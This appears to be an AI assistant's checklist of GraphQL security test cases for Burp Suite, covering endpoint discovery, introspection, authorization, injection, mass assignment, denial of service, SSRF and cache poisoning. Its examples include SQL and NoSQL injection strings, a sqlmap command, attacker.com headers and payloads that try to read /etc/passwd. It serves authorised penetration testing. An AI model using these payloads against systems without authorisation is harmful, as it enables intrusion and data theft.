When testing **GraphQL APIs** in **Burp Suite**, you should focus on various attack vectors, including **information disclosure, injections, misconfigurations, and authorization flaws**. Below are some test cases for **GraphQL security testing using Burp Suite**:

---

### **1. GraphQL Endpoint Discovery**
- Check common GraphQL endpoints:
  - `/graphql`
  - `/graphiql`
  - `/api/graphql`
  - `/v1/graphql`
- Use **Burp Suite Intruder** with a wordlist for discovering GraphQL endpoints.

---

### **2. Introspection Query Testing**
- Check if **introspection queries** are enabled:
  ```graphql
  {
    __schema {
      types {
        name
      }
    }
  }
  ```
- If enabled, extract schema information and sensitive queries/mutations.

---

### **3. Unauthorized Access & BFLA (Broken Function-Level Authorization)**
- Test if an **unauthenticated user** can access GraphQL queries.
- Switch **user roles (JWT, API tokens)** and attempt unauthorized queries.

---

### **4. GraphQL Injection Attacks**
#### **a) SQL Injection**
- Test for SQLi in GraphQL parameters:
  ```graphql
  {
    user(id: "1' OR '1'='1") {
      name
    }
  }
  ```
- Use Burp's **SQLMap** integration:
  ```bash
  sqlmap -u "http://target.com/graphql" --data '{ "query": "{ user(id: \"1\") { name } }" }'
  ```

#### **b) NoSQL Injection**
- Inject NoSQL payloads:
  ```graphql
  {
    user(id: { "$ne": null }) {
      name
    }
  }
  ```

#### **c) Command Injection**
- Test if GraphQL allows command execution:
  ```graphql
  {
    systemInfo(command: "cat /etc/passwd") {
      result
    }
  }
  ```

---

### **5. Mass Assignment Testing**
- Send **extra parameters** to check if you can modify unauthorized fields.
  ```graphql
  mutation {
    updateUser(id: "1", role: "admin") {
      id
      role
    }
  }
  ```

---

### **6. Rate Limiting & DoS**
- Use **Burp Suite Intruder** to send thousands of requests.
- Test with deeply **nested queries** to overload the server:
  ```graphql
  query {
    user {
      friends {
        friends {
          friends {
            name
          }
        }
      }
    }
  }
  ```

---

### **7. File Upload Vulnerabilities**
- Test for **SSRF & RCE** via file uploads:
  ```graphql
  mutation {
    uploadFile(file: "file://etc/passwd") {
      url
    }
  }
  ```

---

### **8. Information Disclosure**
- Look for **verbose error messages** in responses.
- Try **querying all users** to check if **rate limiting & access control** is weak:
  ```graphql
  {
    users {
      id
      email
      passwordHash
    }
  }
  ```

---

### **9. GraphQL CSRF (Cross-Site Request Forgery)**
- If the API does not require authentication headers, test if a **CSRF attack** works.

---

### **10. Web Cache Poisoning**
- Try injecting headers like:
  ```
  X-Forwarded-For: attacker.com
  X-Host: malicious.com
  ```

---

### **11. Logging & Sensitive Data Exposure**
- Check if **GraphQL errors/logs** expose credentials or debug data.

---

### **12. Automated Scanning with Burp Suite Extensions**
- Use **"GraphQL Raider"** for fuzzing GraphQL queries.
- Use **"InQL Scanner"** to extract schema details and auto-generate queries.

---

### **Final Thoughts**
Burp Suite is a powerful tool for GraphQL testing, but **always combine manual testing with automation** for better results. Would you like scripts or automation techniques for some of these test cases? 🚀
